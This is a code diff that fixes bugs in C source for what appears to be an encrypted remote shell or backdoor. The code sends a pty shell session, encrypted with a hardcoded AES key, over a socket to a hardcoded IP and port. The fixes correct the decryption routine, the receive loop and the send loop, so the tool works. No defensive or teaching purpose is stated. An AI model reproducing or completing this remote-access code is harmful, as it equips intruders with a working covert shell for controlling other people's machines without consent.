@@ -12,12 +12,12 @@
 #include <fcntl.h>
 #include <sys/wait.h>
 
-#define BUFFER 1024
+#define BUFFER 4096
 #define PORT 3000
 #define IP "192.168.0.24"
 
 
-unsigned char key[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
+unsigned char key[16] = {'1','0', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
 unsigned char iv[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
 
 int Encrypt(unsigned char in_plain[], int len_plain, unsigned char out_cipher[]){
@@ -28,7 +28,7 @@ int Encrypt(unsigned char in_plain[], int len_plain, unsigned char out_cipher[])
     EVP_EncryptUpdate(ctx, out_cipher, &len, in_plain, len_plain);
     total=len;
 
-    EVP_EncryptFinal_ex(ctx, out_cipher + total, &len);
+    EVP_EncryptFinal_ex(ctx, out_cipher + len, &len);
     total+=len;
 
     EVP_CIPHER_CTX_free(ctx);
@@ -40,11 +40,11 @@ int Decrypt(unsigned char in_cipher[], int len_cipher, unsigned char out_plain[]
     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
     int total,len;
 
-    EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv);
-    EVP_EncryptUpdate(ctx, out_plain, &len, in_cipher, len_cipher);
+    EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv);
+    EVP_DecryptUpdate(ctx, out_plain, &len, in_cipher, len_cipher);
     total=len;
 
-    EVP_EncryptFinal_ex(ctx, out_plain + total, &len);
+    EVP_DecryptFinal_ex(ctx, out_plain + len, &len);
     total+=len;
 
     EVP_CIPHER_CTX_free(ctx);
@@ -55,7 +55,7 @@ int Decrypt(unsigned char in_cipher[], int len_cipher, unsigned char out_plain[]
 int recv_full(int s, unsigned char buff[], int len){
     int total = 0;
 
-    while(len < total){
+    while(total < len){
         int r = recv(s, buff+total, len-total, 0);
         total+=r;
     }
@@ -84,8 +84,8 @@ int send_packet(int s, unsigned char buff[], int len){
 
     while (total<len)
     {
-        int s = send(s, buff+total, len-total, 0);
-        total+=s;
+        int sent = send(s, buff+total, len-total, 0);
+        total+=sent;
     }
 
     return 0;
@@ -124,6 +124,11 @@ void run_session(int sock){
             break;
         }
 
+         if (r == 0)
+        {
+            continue;
+        }
+
         int status;
         pid_t result = waitpid(shell_pid, &status, WNOHANG | WUNTRACED);
 
@@ -151,10 +156,6 @@ void run_session(int sock){
             send_packet(sock, enc, enc_len);
         }
 
-        if (r == 0)
-        {
-            continue;
-        }
     }
     close(master);
 
